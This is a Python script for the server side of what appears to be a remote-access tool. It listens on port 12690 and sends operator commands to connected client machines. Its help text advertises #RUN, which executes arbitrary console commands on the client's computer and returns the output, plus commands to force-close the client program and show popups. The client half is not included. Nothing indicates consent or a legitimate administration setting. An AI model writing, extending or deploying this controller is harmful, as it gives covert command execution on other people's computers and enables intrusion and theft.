import socket

s = socket.socket()
print ("Socket successfully created")

port = 12690

s.bind(('', port))
print ("socket binded to %s" %(port))

s.listen(5)
print ("socket is listening")

def SendAndRecv(socket, data, size):
    try:
        socket.send(str(data).encode())
        return bytes(socket.recv(1024 * size)).decode()
    except:
        print("Failed to send or recvive data, returning None...")
        return None

while True:
    c, addr = s.accept()
    print ("Got connection from", addr )
    print ("Type !help to get a list of commands")
    while True:
        recv = ""
        command = input(">> ")
        if command == "!help":
            print("""
----- IMPORTANT -----
Use | to split arguments

----- Server side commands -----
!DISCONNECT --- Closes the connection server side

----- Client side commands -----
#RUN <command> <should return> --- Runs a command in the console on the clients computer and returns the output back to you
#CLOSE --- Closes the connection client side
#FCLOSE --- Forces the client to close the program
#PING --- Plays Ping Pong with the client
#POPUP <text> <title> <mode> --- Creates a popup box and reports back what button the client presses
""")
        elif command == "!DISCONNECT":
            recv = SendAndRecv(c, "#CLOSE", 4)
            c.close()
            break
        elif command[0:4] == "#RUN":
            recv = SendAndRecv(c, command, 4)
        elif command == "#CLOSE":
            recv = SendAndRecv(c, command, 4)
        elif command == "#FCLOSE":
            recv = SendAndRecv(c, command, 4)
            break
        elif command == "#PING":
            recv = SendAndRecv(c, command, 4)
        elif command[0:6] == "#POPUP":
            recv = SendAndRecv(c, command, 4)

        print(recv)
        if recv == "DISCONNECTED" or recv == None:
            c.close
            break
    
    c.close()